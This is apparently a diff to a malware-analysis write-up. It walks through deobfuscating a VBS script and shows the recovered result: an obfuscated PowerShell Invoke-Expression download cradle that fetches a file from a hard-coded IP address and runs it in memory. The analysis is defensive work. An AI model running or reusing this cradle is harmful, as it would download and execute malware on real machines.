@@ -42,6 +42,23 @@ The xlm.txt file contains a Visual Basic Script (VBS) that declares an array and
  
 By placing the wscript.echo command we can view the output of the variable to the console.
 
+![image](https://github.com/user-attachments/assets/96a50816-aebd-4861-b747-3c543bc282e9)
+
+Open a command prompt and run the .vbs file with cscript.exe displaying the output. 
+
+![image](https://github.com/user-attachments/assets/14dea8b7-4225-46fc-9493-9841ff497ff3)
+
+Bring the output into a text editor and clean it up.  The "[BYTe[]]" lines are not useful and probably a way to confuse people and machine.  
+
+	$A123 = "IeX(NeW-OBJeCT NeT.W"
+	$B456 = "eBCLIeNT).DOWNLO"
+	$C789 = "'VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING')"
+	IeX($A123+$B456+$C789)
+
+This script downloads the first stage of malware and executes in into memory using Invoke-Expression (IeX)
+
+
+
 
 
 
